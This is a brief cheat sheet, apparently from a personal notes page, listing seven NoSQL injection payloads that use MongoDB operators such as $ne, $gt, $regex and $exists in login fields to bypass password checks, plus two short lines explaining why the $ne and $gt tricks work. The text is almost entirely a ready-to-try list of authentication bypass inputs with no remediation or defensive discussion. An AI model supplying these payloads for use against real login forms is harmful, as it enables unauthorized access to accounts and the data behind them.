NoSQL Injection is a security vulnerability where an attacker manipulates database queries in MongoDB by injecting malicious input (JSON operators like $ne, $gt) to bypass authentication

username: admin
password: {"$ne": null}

🔹 2. Both Fields

username: {"$ne": null}
password: {"$ne": null}

🔹 3. Using $gt

username: {"$gt": ""}
password: {"$gt": ""}

🔹 4. Regex Match

username: admin
password: {"$regex": ".*"}

🔹 5. Exists Check

username: admin
password: {"$exists": true}

🔹 6. Try Empty Bypass

username: admin
password: {}

🔹 7. Simple Trick

username: admin
password: {"$ne": "wrong"}


check only that the password exists (not null), not whether it is correct =  {"$ne": null}
It doesn’t verify the correct password, it only checks that a password exists (non-empty) = {"$gt": ""}
